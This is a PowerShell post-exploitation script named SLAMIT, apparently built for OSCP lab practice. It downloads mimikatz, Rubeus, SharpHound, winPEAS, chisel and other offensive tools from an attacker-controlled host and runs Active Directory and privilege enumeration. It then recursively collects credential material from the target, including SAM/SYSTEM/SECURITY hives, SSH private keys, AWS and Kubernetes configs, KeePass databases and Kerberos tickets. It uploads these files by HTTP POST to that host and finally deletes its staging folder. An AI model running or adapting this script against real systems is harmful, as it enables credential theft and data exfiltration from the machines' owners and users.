# =============================================================================
# SLAMIT - Windows System Enumeration and File Exfiltration Tool
# =============================================================================
# 
# This PowerShell script performs comprehensive Windows system enumeration
# and uploads interesting files to a web server. It includes:
# - Tool downloads (mimikatz, SharpHound, winPEAS, etc.)
# - Active Directory enumeration (SharpHound)
# - System enumeration (winPEAS)
# - File discovery and upload
# 
# =============================================================================

$uri = "http://192.168.45.163:80";
# $uri = "http://10.10.202.153:80" # set up a ligolo listener first!
$baseDir = "/home/kali/projects/oscp";
$mainDir = "challenges";
$proj = "oscp_c";
# $hn = [System.Net.Dns]::GetHostName();
$hn = "MS02"
$targetFolder = "$baseDir/$mainDir/$proj/$hn";

Set-Location "C:\Users\Public"
$thisDir = Get-Location

# Function to create centered section headers
function Write-SectionHeader {
    param([string]$Title)
    
    $width = 100
    $borderChar = "#"
    $paddingChar = " "
    
    # Calculate hammer-centered positioning for the box
    # The hammer's center point is approximately at the visual center of the hammer
    # Looking at the hammer lines, the visual center is around position 60-65
    $hammerCenter = 62
    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($width / 2))
    $leftPadding = " " * $leftMargin
    
    # Top border
    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Cyan
    
    # Empty line
    $emptyLine = $borderChar + ($paddingChar * ($width - 2)) + $borderChar
    Write-Host ($leftPadding + $emptyLine) -ForegroundColor Cyan
    
    # Centered header
    $innerWidth = $width - 2
    $textLen = $Title.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $headerLine = $borderChar + ($paddingChar * $leftPad) + $Title + ($paddingChar * $rightPad) + $borderChar
    Write-Host ($leftPadding + $headerLine) -ForegroundColor Cyan
    
    # Empty line
    Write-Host ($leftPadding + $emptyLine) -ForegroundColor Cyan
    
    # Bottom border
    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Cyan
    Write-Host ""
}

# Function to create centered completion messages
function Write-CompletionMessage {
    param([string]$Message)
    
    $width = 102
    $borderChar = "="
    $paddingChar = " "
    
    # Calculate hammer-centered positioning for the box
    # The hammer's center point is approximately at the visual center of the hammer
    # Looking at the hammer lines, the visual center is around position 60-65
    $hammerCenter = 62
    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($width / 2))
    $leftPadding = " " * $leftMargin
    
    # Top border
    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Green
    
    # Centered message
    $innerWidth = $width - 2
    $textLen = $Message.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $messageLine = $borderChar + ($paddingChar * $leftPad) + $Message + ($paddingChar * $rightPad) + $borderChar
    Write-Host ($leftPadding + $messageLine) -ForegroundColor Green
    
    # Bottom border
    Write-Host ($leftPadding + ($borderChar * $width)) -ForegroundColor Green
    Write-Host ""
}

# Function to center regular text output
function Write-CenteredText {
    param([string]$Text, [string]$Color = "White")
    
    # Calculate hammer-centered positioning
    # The hammer's center point is approximately at the visual center of the hammer
    # Looking at the hammer lines, the visual center is around position 60-65
    $hammerCenter = 62
    $leftMargin = [math]::Max(0, $hammerCenter - [math]::Floor($Text.Length / 2))
    $leftPadding = " " * $leftMargin
    
    Write-Host ($leftPadding + $Text) -ForegroundColor $Color
}

# Create a perfectly aligned SLAMIT banner
Write-Host ""


Write-Host "                                       _________.____       _____      _____  .______________" -ForegroundColor Cyan
Write-Host "                                      /   _____/|    |     /  _  \    /     \ |   \__    ___/" -ForegroundColor Cyan
Write-Host "                                      \_____  \ |    |    /  /_\  \  /  \ /  \|   | |    |   " -ForegroundColor Cyan
Write-Host "                                      /        \|    |___/    |    \/    Y    \   | |    |   " -ForegroundColor Cyan
Write-Host "                                     /_______  /|_______ \____|__  /\____|__  /___| |____|   " -ForegroundColor Cyan
Write-Host "                                             \/         \/       \/         \/               " -ForegroundColor Cyan

Write-Host ""
Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
Write-Host "            ...................................................................................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%%+***#%.............................................." -ForegroundColor DarkGray
Write-Host "            ............................................##%%....#%+%............................................" -ForegroundColor DarkGray
Write-Host "            ............................................%*%......%*%............................................" -ForegroundColor DarkGray
Write-Host "            .............................................%+@....@%%*............................................" -ForegroundColor DarkGray
Write-Host "            .............................................%+%....%+%............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%*%..%+%.............................................." -ForegroundColor DarkGray
Write-Host "            ...............................................%%%%%%..............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%*+***+%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%+***+*%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%%%%%%%%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%***+++%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%***++*%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%%%%%%%%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%+++*++%.............................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%*+****%.............................................." -ForegroundColor DarkGray
Write-Host "            ................................%.............%%%%%%%%.............................................." -ForegroundColor DarkGray
Write-Host "            .................................%.....:......%****++%.......%......................................" -ForegroundColor DarkGray
Write-Host "            ..................................%....@......%+*****%......%......#................................" -ForegroundColor DarkGray
Write-Host "            ...................................%....%.....%%%%%%*%......%.....%................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%*+****%...........%.................................." -ForegroundColor DarkGray
Write-Host "            ..............................................%******%....................-%........................" -ForegroundColor DarkGray
Write-Host "            ..........................%...................%*+****%...................%.........................." -ForegroundColor DarkGray
Write-Host "            ............................%...%%%########***++============+++*#%%%...%............................" -ForegroundColor DarkGray
Write-Host "            ...............................%-=%=========-=============-====--%=-@..............................." -ForegroundColor DarkGray
Write-Host "            ...............................%-=%======-==-=-==================%=-@..............................." -ForegroundColor DarkGray
Write-Host "            .....................%%........%==%===--========================-%-=%........@@....................." -ForegroundColor DarkGray
Write-Host "            ...............................%==%======-=====-=================%==%....@%+........................" -ForegroundColor DarkGray
Write-Host "            ...............................%==%================--======-=====%==%..............................." -ForegroundColor DarkGray
Write-Host "            ...............................%==%==============================%==%..............................." -ForegroundColor DarkGray
Write-Host "            ....................#@:........%=-%=========-=====%%=============%==%........*%....................." -ForegroundColor DarkGray
Write-Host "            ......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................" -ForegroundColor DarkGray
Write-Host "            ........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@......................." -ForegroundColor DarkGray
Write-Host "            ........................%##%%%--------------%--%%%--%#%--%-------------%%###@......................." -ForegroundColor DarkGray
Write-Host "            ........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@......................." -ForegroundColor DarkGray
Write-Host "            .......................:###%----@%:------%-----%----:-------%=----%-----:###@......................." -ForegroundColor DarkGray
Write-Host "            ..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@......................." -ForegroundColor DarkGray
Write-Host "            .......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@......................." -ForegroundColor DarkGray
Write-Host "            ........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@......................." -ForegroundColor DarkGray
Write-Host "            ........................###%--------%-----:%#####%%%###%%------%--------=###@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@------%--%%------%%%##%###%------@%--%-------%##@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@%@%------------%------%-----%#---------------%##@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@%%----------+%--------%-------%--------------%##@......................." -ForegroundColor DarkGray
Write-Host "            ........................###@------------%------------------%-------------%##@......................." -ForegroundColor DarkGray
Write-Host "            .......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@......................." -ForegroundColor DarkGray
Write-Host "            .......................=####################################################@......................." -ForegroundColor DarkGray
Write-Host "            ........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................" -ForegroundColor DarkGray
Write-Host "            .............................................%#########*............................................" -ForegroundColor DarkGray
Write-Host "            .............................................%##########............................................" -ForegroundColor DarkGray
Write-Host "            .....................................%#########################....................................." -ForegroundColor DarkGray
Write-Host "            ......................................::::::::::::::::::::::::......................................" -ForegroundColor DarkGray
Write-Host ""

Write-SectionHeader "Download Tools"

try
{
    # Invoke-WebRequest -Uri "$uri/SysinternalsSuite.zip" -O SysinternalsSuite.zip
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/mimikatz64.exe" -Outfile mimikatz.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/SharpHound.exe" -Outfile SharpHound.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/winPEASx64.exe" -Outfile winPEAS.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PowerView.ps1" -Outfile PowerView.ps1
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PowerUp.ps1" -Outfile PowerUp.ps1
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PsExec64.exe" -Outfile PsExec.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/Rubeus.exe" -Outfile Rubeus.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/chisel_win" -Outfile chisel.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/agent.exe" -Outfile agent.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/custom_upload.ps1" -Outfile custom_upload.ps1
}
catch
{
    Write-Error "Downloads failed: Error: $_"
}

Write-CompletionMessage "Download Tools Complete"


Write-SectionHeader "Active Directory Enumeration (SharpHound)"
try
{
    $exePath = "$thisDir\Sharphound.exe"
    Start-Process "$exePath" -ArgumentList "-c", "all"
}
catch
{
    Write-Error "Sharphound failed: Error: $_"
}

Write-CompletionMessage "SharpHound Enumeration Complete"

Write-SectionHeader "System Enumeration (winPEAS)"
try
{
    $exePath = "$thisDir\winPEAS.exe"
    $outputFile = "$thisDir\winPEAS_out.txt"
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $exePath
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true
    $startInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $startInfo.StandardErrorEncoding = [System.Text.Encoding]::UTF8
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    $null = $process.Start()
    $output = $process.StandardOutput.ReadToEnd()
    $errorOutput = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    # Combine outputs
    $fullOutput = $output + "`r`n" + $errorOutput
    # Save output to file
    $fullOutput | Out-File -FilePath $outputFile -Encoding UTF8
}
catch
{
    Write-Error "winPEAS failed! Error: $_"
}

Write-CompletionMessage "winPEAS Enumeration Complete"

Write-SectionHeader "File Discovery and Collection"

# Create a dedicated staging directory for discovered files
$stagingDir = Join-Path -Path $thisDir -ChildPath "SLAMIT_Discovered_Files"
if (Test-Path $stagingDir) {
    Remove-Item -Path $stagingDir -Recurse -Force
}
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Write-CenteredText "Created staging directory: $stagingDir" "Yellow"

# File extensions to include
$extensions = @(
    '*.txt', '*.log', '*.pdf', '*.zip', '*.doc', '*.docx', '*.xls', '*.xlsx',
    '*.ppt', '*.pptx', '*.csv', '*.ini', '*.conf', '*.cfg', '*.env',
    '*.yaml', '*.yml', '*.json', '*.xml', '*.ps1', '*.bat', '*.cmd', '*.sh',
    '*.kdbx', '*.rdp', '*.7z', '*.rar', '*.tar', '*.gz', '*.bak', '*.old',
    '*.tmp', '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb', '*.rtf', '*.md',
    '*.kerberoast', '*.kirb', '*.pem', '*.p12', '*.pfx', '*.key', '*.crt', '*.cer',
    '*.p7b', '*.p7c', '*.ccache', '*.hccapx', '*.wpa', '*.pcap', '*.pcapng', '*.cap'
)
# Add interesting files (exclude .exe to avoid tool contamination)
$interestingFiles = @(
    ".git*", "id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "local.txt", "proof.txt", 
    "SAM", "SYSTEM", "SECURITY", "SOFTWARE", "NTUSER.DAT", "UsrClass.dat",
    "web.config", "appsettings.json", ".env", ".env.local", ".env.production",
    ".aws\credentials", ".aws\config", ".docker\config.json", ".kube\config",
    ".npmrc", ".pip\pip.conf", ".netrc", ".my.cnf", ".pgpass", ".ldaprc",
    ".subversion\config", ".gnupg\secring.gpg", ".gnupg\pubring.gpg",
    ".gnupg\trustdb.gpg", ".ssh\known_hosts", ".ssh\config", ".aws\credentials",
    ".aws\config", ".docker\config.json", ".kube\config", ".npmrc", ".pip\pip.conf",
    ".netrc", ".my.cnf", ".pgpass", ".ldaprc", ".subversion\config",
    ".gnupg\secring.gpg", ".gnupg\pubring.gpg", ".gnupg\trustdb.gpg"
)

# Define source and destination
$sourceRoot = "C:\"

# Comprehensive list of tools and scripts to exclude
$excludePatterns = @(
    "mimikatz*", "SharpHound*", "winPEAS.exe*", "PowerView*", "PowerUp*", 
    "BloodHound*", "custom_upload*", "slamit*", "PsExec*", "Rubeus*", 
    "chisel*", "agent*", "*.ps1", "*.exe", "*.bat", "*.cmd"
)

try {
    $allFiles = @()
    $stagedFiles = @()

    Write-CenteredText "Searching for interesting files..." "Yellow"

    # Search for interesting files
    foreach ($if in $interestingFiles) {
        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $if -File -ErrorAction SilentlyContinue
        if ($found) {
            $allFiles += $found
        }
    }

    # Search Users folder for extensions (exclude tool files)
    $sourceRoot += "Users"
    foreach ($ext in $extensions) {
        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $ext -File -ErrorAction SilentlyContinue
        if ($found) {
            # Filter out tool files and scripts
            $filteredFiles = $found | Where-Object { 
                $fileName = $_.Name.ToLower()
                $shouldExclude = $false
                foreach ($pattern in $excludePatterns) {
                    if ($fileName -like $pattern.ToLower()) {
                        $shouldExclude = $true
                        break
                    }
                }
                -not $shouldExclude
            }
            if ($filteredFiles) {
                $allFiles += $filteredFiles
            }
        }
    }

    Write-CenteredText "Found $($allFiles.Count) interesting files" "Green"

    # Stage files to the dedicated directory
    foreach ($file in $allFiles) {
        try {
            # Create a unique filename to avoid conflicts
            $fileName = $file.Name
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
            $extension = [System.IO.Path]::GetExtension($fileName)
            
            # For system files like SAM/SYSTEM, include path info
            if ($fileName -match "^(SAM|SYSTEM)$") {
                $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")
                $fileName = "$baseName`_$sanitizedPath$extension"
            }
            
            $targetPath = Join-Path -Path $stagingDir -ChildPath $fileName
            $counter = 1

            # Handle conflicts by adding -1, -2, etc.
            while (Test-Path $targetPath) {
                $targetPath = Join-Path -Path $stagingDir -ChildPath "$baseName-$counter$extension"
                $counter++
            }

            # Copy file to staging directory
            Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
            $stagedFiles += $targetPath
            Write-CenteredText "Staged: $($file.Name) → $targetPath" "Green"
        }
        catch {
            Write-CenteredText "Failed to stage: $($file.FullName) — $_" "Yellow"
        }
    }

    Write-CenteredText "Successfully staged $($stagedFiles.Count) files to: $stagingDir" "Green"
}
catch {
    Write-CenteredText "File discovery failed: $_" "Yellow"
}

Write-CompletionMessage "File Discovery and Collection Complete"


Write-SectionHeader "File Upload"
try
{
    # Only upload files from the staging directory to prevent duplicates and tool contamination
    if (-not (Test-Path $stagingDir)) {
        Write-CenteredText "Staging directory not found. No files to upload." "Yellow"
        return
    }

    # Get all files from the staging directory
    $files = Get-ChildItem -Path $stagingDir -File -Recurse -ErrorAction SilentlyContinue
    
    if ($files.Count -eq 0) {
        Write-CenteredText "No files found in staging directory to upload." "Yellow"
        return
    }

    Write-CenteredText "Starting upload of $($files.Count) staged files..." "Yellow"
    
    $uploadCount = 0
    $successCount = 0
    $failedCount = 0
    
    foreach ($file in $files) {
        $uploadCount++
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
            $boundary = [System.Guid]::NewGuid().ToString()
            $lf = "`r`n"
            $fileName = [System.IO.Path]::GetFileName($file.FullName)

            # Folder part
            $folderPart = "--$boundary$lf" +
                        "Content-Disposition: form-data; name=`"folder`"$lf$lf" +
                        "$targetFolder$lf"

            # File part
            $fileHeader = "--$boundary$lf" +
                        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$lf" +
                        "Content-Type: application/octet-stream$lf$lf"

            # Footer
            $footer = "$lf--$boundary--$lf"

            # Convert header strings to bytes
            $encoding = [System.Text.Encoding]::ASCII
            $folderBytes = $encoding.GetBytes($folderPart)
            $fileHeaderBytes = $encoding.GetBytes($fileHeader)
            $footerBytes = $encoding.GetBytes($footer)

            # Construct full body
            $bodyBytes = New-Object byte[] ($folderBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length + $footerBytes.Length)
            [System.Array]::Copy($folderBytes, 0, $bodyBytes, 0, $folderBytes.Length)
            [System.Array]::Copy($fileHeaderBytes, 0, $bodyBytes, $folderBytes.Length, $fileHeaderBytes.Length)
            [System.Array]::Copy($fileBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length, $fileBytes.Length)
            [System.Array]::Copy($footerBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length, $footerBytes.Length)

            # Upload using Invoke-WebRequest (silent)
            $null = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -ErrorAction SilentlyContinue
            $successCount++
        }
        catch {
            $failedCount++
            $fileName = [System.IO.Path]::GetFileName($file)
            Write-CenteredText "Upload failed for: $fileName" "Red"
            Write-CenteredText "Error: $($_.Exception.Message)" "Red"
        }
    }

    # Simple centered upload summary
    Write-Host ""
    Write-CenteredText "Upload Summary:" "Cyan"
    Write-CenteredText "  Total Files Processed: $uploadCount" "White"
    Write-CenteredText "  Successfully Uploaded: $successCount" "Green"
    Write-CenteredText "  Failed Uploads: $failedCount" "Red"
    Write-Host ""
    
    # Check if any uploads failed and exit if so
    if ($failedCount -gt 0) {
        Write-CenteredText "Upload failures detected - cleanup will not continue" "Red"
        exit 1
    }
}
catch
{
    Write-CenteredText "Upload Files failed: Error: $_" "Red"
}

Write-CompletionMessage "File Upload Complete"

# Cleanup staging directory
try {
    if (Test-Path $stagingDir) {
        Remove-Item -Path $stagingDir -Recurse -Force
        Write-CenteredText "Cleaned up staging directory: $stagingDir" "Green"
    }
}
catch {
    Write-CenteredText "Failed to cleanup staging directory: $_" "Yellow"
}

# Final completion message
Write-Host ""
Write-SectionHeader "SLAMIT COMPLETE"
Write-CenteredText "All operations completed successfully!" "Green"
Write-CenteredText "Files were staged, uploaded, and cleaned up automatically." "Yellow"
Write-Host ""
